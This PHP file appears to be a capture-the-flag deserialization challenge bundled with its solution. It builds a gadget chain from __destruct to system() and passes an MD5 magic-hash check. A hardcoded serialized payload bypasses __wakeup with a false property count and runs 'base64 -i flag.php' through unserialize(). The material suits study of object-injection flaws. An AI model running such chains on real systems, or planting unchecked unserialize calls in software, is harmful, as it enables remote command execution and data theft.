<?php
class C
{
    public $manba;
    function __get($argv)
    {
        $want = $this->manba;
        return $want();
    }
}
class YULIN
{
    public $cmd;
    function __invoke()
    {
        system($this->cmd);
    }
    function __wakeup()
    {
        $this->cmd = "nonono";
    }
}
class T
{
    public $sth;
    function __toString()
    {
        return $this->sth->var;
    }
}

class F
{
    public $user = "what can i say";
    public $notes;
    function __construct($user)
    {
        $this->user = $user;
    }
    function __destruct()
    {
        if ((string)$this->user !== 'aabg7XSs' && md5($this->user) == md5('aabg7XSs')) {
            echo $this->notes;
        } else {
            die("N0!");
        }
    }
}


$Yulin = new YULIN();
$Yulin->cmd = "base64 faster.py";

$CallFunction = new C();
$CallFunction->manba = $Yulin;

$String = new T();
$String->sth = $CallFunction;

$UserCompare = new F("aabC9RqS");
$UserCompare->notes = $String;

$ser = base64_encode(serialize($UserCompare));
$ser = "TzoxOiJGIjoyOntzOjQ6InVzZXIiO3M6ODoiYWFiQzlScVMiO3M6NToibm90ZXMiO086MToiVCI6MTp7czozOiJzdGgiO086MToiQyI6MTp7czo1OiJtYW5iYSI7Tzo1OiJZVUxJTiI6Mjp7czozOiJjbWQiO3M6MTg6ImJhc2U2NCAtaSBmbGFnLnBocCI7fX19fQ";

if (isset($ser)) {
    $ser = unserialize(base64_decode($ser));
} else {
    echo "what is the MoShuFangFa???";
}
